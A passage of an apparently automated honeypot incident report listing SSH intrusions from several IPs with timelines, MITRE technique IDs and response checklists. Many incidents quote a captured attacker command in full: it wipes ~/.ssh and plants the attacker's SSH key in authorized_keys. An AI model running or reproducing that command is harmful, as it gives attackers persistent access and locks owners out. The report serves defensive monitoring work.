| `2026-06-05 15:44:12` | `cowrie.client.kex` |
| `2026-06-05 15:44:12` | `cowrie.login.success` |
| `2026-06-05 15:44:12` | `cowrie.session.params` |
| `2026-06-05 15:44:12` | `cowrie.command.input` |
| `2026-06-05 15:44:12` | `cowrie.command.failed` |
| `2026-06-05 15:44:12` | `cowrie.log.closed` |
| `2026-06-05 15:44:12` | `cowrie.session.params` |
| `2026-06-05 15:44:12` | `cowrie.command.input` |
| `2026-06-05 15:44:12` | `cowrie.session.file_download` |
| `2026-06-05 15:44:12` | `cowrie.log.closed` |
| `2026-06-05 15:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5103940dc6

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:44 |
| **Last Seen** | 2026-06-05 15:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:44:14` | `cowrie.session.connect` |
| `2026-06-05 15:44:14` | `cowrie.client.version` |
| `2026-06-05 15:44:14` | `cowrie.client.kex` |
| `2026-06-05 15:44:14` | `cowrie.login.success` |
| `2026-06-05 15:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-965647953926

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:56 |
| **Last Seen** | 2026-06-05 15:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:56:07` | `cowrie.session.connect` |
| `2026-06-05 15:56:07` | `cowrie.client.version` |
| `2026-06-05 15:56:07` | `cowrie.client.kex` |
| `2026-06-05 15:56:07` | `cowrie.login.success` |
| `2026-06-05 15:56:08` | `cowrie.session.params` |
| `2026-06-05 15:56:08` | `cowrie.command.input` |
| `2026-06-05 15:56:08` | `cowrie.command.failed` |
| `2026-06-05 15:56:08` | `cowrie.log.closed` |
| `2026-06-05 15:56:08` | `cowrie.session.params` |
| `2026-06-05 15:56:08` | `cowrie.command.input` |
| `2026-06-05 15:56:08` | `cowrie.session.file_download` |
| `2026-06-05 15:56:08` | `cowrie.log.closed` |
| `2026-06-05 15:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380e6ae5e20c

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:56 |
| **Last Seen** | 2026-06-05 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:56:09` | `cowrie.session.connect` |
| `2026-06-05 15:56:09` | `cowrie.client.version` |
| `2026-06-05 15:56:09` | `cowrie.client.kex` |
| `2026-06-05 15:56:10` | `cowrie.login.success` |
| `2026-06-05 15:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aac7233e2c3

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 15:59 |
| **Last Seen** | 2026-06-05 15:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:59:51` | `cowrie.session.connect` |
| `2026-06-05 15:59:51` | `cowrie.client.version` |
| `2026-06-05 15:59:51` | `cowrie.client.kex` |
| `2026-06-05 15:59:52` | `cowrie.login.success` |
| `2026-06-05 15:59:52` | `cowrie.session.params` |
| `2026-06-05 15:59:52` | `cowrie.command.input` |
| `2026-06-05 15:59:52` | `cowrie.command.failed` |
| `2026-06-05 15:59:52` | `cowrie.log.closed` |
| `2026-06-05 15:59:53` | `cowrie.session.params` |
| `2026-06-05 15:59:53` | `cowrie.command.input` |
| `2026-06-05 15:59:53` | `cowrie.session.file_download` |
| `2026-06-05 15:59:53` | `cowrie.log.closed` |
| `2026-06-05 15:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a3f74268b3b

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 15:59 |
| **Last Seen** | 2026-06-05 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:59:56` | `cowrie.session.connect` |
| `2026-06-05 15:59:56` | `cowrie.client.version` |
| `2026-06-05 15:59:56` | `cowrie.client.kex` |
| `2026-06-05 15:59:56` | `cowrie.login.success` |
| `2026-06-05 15:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad7902b9481

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 16:02 |
| **Last Seen** | 2026-06-05 16:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:02:29` | `cowrie.session.connect` |
| `2026-06-05 16:02:29` | `cowrie.client.version` |
| `2026-06-05 16:02:29` | `cowrie.client.kex` |
| `2026-06-05 16:02:30` | `cowrie.login.success` |
| `2026-06-05 16:02:30` | `cowrie.session.params` |
| `2026-06-05 16:02:30` | `cowrie.command.input` |
| `2026-06-05 16:02:30` | `cowrie.command.failed` |
| `2026-06-05 16:02:31` | `cowrie.log.closed` |
| `2026-06-05 16:02:31` | `cowrie.session.params` |
| `2026-06-05 16:02:31` | `cowrie.command.input` |
| `2026-06-05 16:02:31` | `cowrie.session.file_download` |
| `2026-06-05 16:02:31` | `cowrie.log.closed` |
| `2026-06-05 16:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f9861bbd8d

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 16:02 |
| **Last Seen** | 2026-06-05 16:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:02:34` | `cowrie.session.connect` |
| `2026-06-05 16:02:34` | `cowrie.client.version` |
| `2026-06-05 16:02:34` | `cowrie.client.kex` |
| `2026-06-05 16:02:35` | `cowrie.login.success` |
| `2026-06-05 16:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-330db4ae96d8

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:03 |
| **Last Seen** | 2026-06-05 16:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:03:55` | `cowrie.session.connect` |
| `2026-06-05 16:03:55` | `cowrie.client.version` |
| `2026-06-05 16:03:55` | `cowrie.client.kex` |
| `2026-06-05 16:03:55` | `cowrie.login.success` |
| `2026-06-05 16:03:56` | `cowrie.session.params` |
| `2026-06-05 16:03:56` | `cowrie.command.input` |
| `2026-06-05 16:03:56` | `cowrie.command.failed` |
| `2026-06-05 16:03:56` | `cowrie.log.closed` |
| `2026-06-05 16:03:56` | `cowrie.session.params` |
| `2026-06-05 16:03:56` | `cowrie.command.input` |
| `2026-06-05 16:03:56` | `cowrie.session.file_download` |
| `2026-06-05 16:03:56` | `cowrie.log.closed` |
| `2026-06-05 16:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a8ab3116e8a

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:03 |
| **Last Seen** | 2026-06-05 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:03:57` | `cowrie.session.connect` |
| `2026-06-05 16:03:57` | `cowrie.client.version` |
| `2026-06-05 16:03:57` | `cowrie.client.kex` |
| `2026-06-05 16:03:58` | `cowrie.login.success` |
| `2026-06-05 16:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d1a268f9da

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 16:05 |
| **Last Seen** | 2026-06-05 16:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:05:33` | `cowrie.session.connect` |
| `2026-06-05 16:05:33` | `cowrie.client.version` |
| `2026-06-05 16:05:33` | `cowrie.client.kex` |
| `2026-06-05 16:05:33` | `cowrie.login.success` |
| `2026-06-05 16:05:34` | `cowrie.session.params` |
| `2026-06-05 16:05:34` | `cowrie.command.input` |
| `2026-06-05 16:05:34` | `cowrie.command.failed` |
| `2026-06-05 16:05:34` | `cowrie.log.closed` |
| `2026-06-05 16:05:34` | `cowrie.session.params` |
| `2026-06-05 16:05:34` | `cowrie.command.input` |
| `2026-06-05 16:05:35` | `cowrie.session.file_download` |
| `2026-06-05 16:05:35` | `cowrie.log.closed` |
| `2026-06-05 16:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251fbb8fc214

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 16:05 |
| **Last Seen** | 2026-06-05 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:05:37` | `cowrie.session.connect` |
| `2026-06-05 16:05:37` | `cowrie.client.version` |
| `2026-06-05 16:05:37` | `cowrie.client.kex` |
| `2026-06-05 16:05:38` | `cowrie.login.success` |
| `2026-06-05 16:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e669ad98cf8c

| Field | Detail |
|---|---|
| **Source IP** | `194.74.196[.]10` |
| **First Seen** | 2026-06-05 16:06 |
| **Last Seen** | 2026-06-05 16:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:06:47` | `cowrie.session.connect` |
| `2026-06-05 16:06:47` | `cowrie.client.version` |
| `2026-06-05 16:06:47` | `cowrie.client.kex` |
| `2026-06-05 16:06:48` | `cowrie.login.success` |
| `2026-06-05 16:06:48` | `cowrie.session.params` |
| `2026-06-05 16:06:48` | `cowrie.command.input` |
| `2026-06-05 16:06:48` | `cowrie.command.failed` |
| `2026-06-05 16:06:48` | `cowrie.log.closed` |
| `2026-06-05 16:06:49` | `cowrie.session.params` |
| `2026-06-05 16:06:49` | `cowrie.command.input` |
| `2026-06-05 16:06:49` | `cowrie.session.file_download` |
| `2026-06-05 16:06:49` | `cowrie.log.closed` |
| `2026-06-05 16:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.74.196[.]10` to AbuseIPDB if not already reported
- [ ] Block `194.74.196[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48dcee9d41e6

| Field | Detail |
|---|---|
| **Source IP** | `194.74.196[.]10` |
| **First Seen** | 2026-06-05 16:06 |
| **Last Seen** | 2026-06-05 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:06:51` | `cowrie.session.connect` |
| `2026-06-05 16:06:51` | `cowrie.client.version` |
| `2026-06-05 16:06:52` | `cowrie.client.kex` |
| `2026-06-05 16:06:52` | `cowrie.login.success` |
| `2026-06-05 16:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.74.196[.]10` to AbuseIPDB if not already reported
- [ ] Block `194.74.196[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c42b18d1c567

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 16:06 |
| **Last Seen** | 2026-06-05 16:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:06:55` | `cowrie.session.connect` |
| `2026-06-05 16:06:55` | `cowrie.client.version` |
| `2026-06-05 16:06:55` | `cowrie.client.kex` |
| `2026-06-05 16:06:56` | `cowrie.login.success` |
| `2026-06-05 16:06:56` | `cowrie.session.params` |
| `2026-06-05 16:06:56` | `cowrie.command.input` |
| `2026-06-05 16:06:56` | `cowrie.command.failed` |
| `2026-06-05 16:06:57` | `cowrie.log.closed` |
| `2026-06-05 16:06:57` | `cowrie.session.params` |
| `2026-06-05 16:06:57` | `cowrie.command.input` |
| `2026-06-05 16:06:57` | `cowrie.session.file_download` |
| `2026-06-05 16:06:57` | `cowrie.log.closed` |
| `2026-06-05 16:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e1ee7b4149

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 16:07 |
| **Last Seen** | 2026-06-05 16:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:07:00` | `cowrie.session.connect` |
| `2026-06-05 16:07:00` | `cowrie.client.version` |
| `2026-06-05 16:07:00` | `cowrie.client.kex` |
| `2026-06-05 16:07:01` | `cowrie.login.success` |
| `2026-06-05 16:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793577ed1f1d

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:09 |
| **Last Seen** | 2026-06-05 16:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:09:58` | `cowrie.session.connect` |
| `2026-06-05 16:09:58` | `cowrie.client.version` |
| `2026-06-05 16:09:58` | `cowrie.client.kex` |
| `2026-06-05 16:09:58` | `cowrie.login.success` |
| `2026-06-05 16:09:58` | `cowrie.session.params` |
| `2026-06-05 16:09:58` | `cowrie.command.input` |
| `2026-06-05 16:09:58` | `cowrie.command.failed` |
| `2026-06-05 16:09:58` | `cowrie.log.closed` |
| `2026-06-05 16:09:58` | `cowrie.session.params` |
| `2026-06-05 16:09:58` | `cowrie.command.input` |
| `2026-06-05 16:09:58` | `cowrie.session.file_download` |
| `2026-06-05 16:09:58` | `cowrie.log.closed` |
| `2026-06-05 16:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913fa10292d8

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:10 |
| **Last Seen** | 2026-06-05 16:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:10:00` | `cowrie.session.connect` |
| `2026-06-05 16:10:00` | `cowrie.client.version` |
| `2026-06-05 16:10:00` | `cowrie.client.kex` |
| `2026-06-05 16:10:00` | `cowrie.login.success` |
| `2026-06-05 16:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
